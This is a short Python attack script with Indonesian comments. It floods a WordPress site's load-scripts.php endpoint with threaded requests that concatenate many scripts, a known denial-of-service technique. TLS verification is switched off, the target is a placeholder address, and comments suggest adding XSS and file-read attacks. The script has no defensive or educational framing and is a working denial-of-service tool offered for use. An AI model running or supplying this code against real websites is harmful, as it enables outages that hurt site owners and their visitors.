import requests
import threading
import time
import random

from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

session = requests.Session()

def safe_request_get(url):
    retries = 3
    for attempt in range(retries):
        try:
            response = session.get(url, verify=False, timeout=5)
            return response
        except (requests.exceptions.ConnectionError, requests.exceptions.Timeout) as e:
            if attempt < retries - 1:
                wait = random.uniform(0.5, 1.5)
                print(f"Retrying after error: {e}, waiting {wait:.2f}s")
                time.sleep(wait)
            else:
                print(f"Request failed after {retries} attempts: {e}")
                return None

def attack_load_scripts(url, count):
    payload = "?c=1&load=editor,common,user-profile,heartbeat"
    for i in range(count):
        full_url = url + "/wp-admin/load-scripts.php" + payload
        r = safe_request_get(full_url)
        if r:
            print(f"[Flood] Request {i+1}: Status {r.status_code}")
        else:
            print(f"[Flood] Request {i+1} failed")
        time.sleep(random.uniform(0.1, 0.5))

# Lakukan hal serupa untuk fungsi attack_xss() dan attack_file_read() jika perlu

def do_multithread_attack(url):
    threads = []
    threads.append(threading.Thread(target=attack_load_scripts, args=(url,50)))
    # Tambah thread lain sesuai kebutuhan, implementasi retry sama juga
    for t in threads:
        t.start()
    for t in threads:
        t.join()

if __name__ == "__main__":
    target_url = "https://alamat-web-dummy-anda.com"
    do_multithread_attack(target_url)
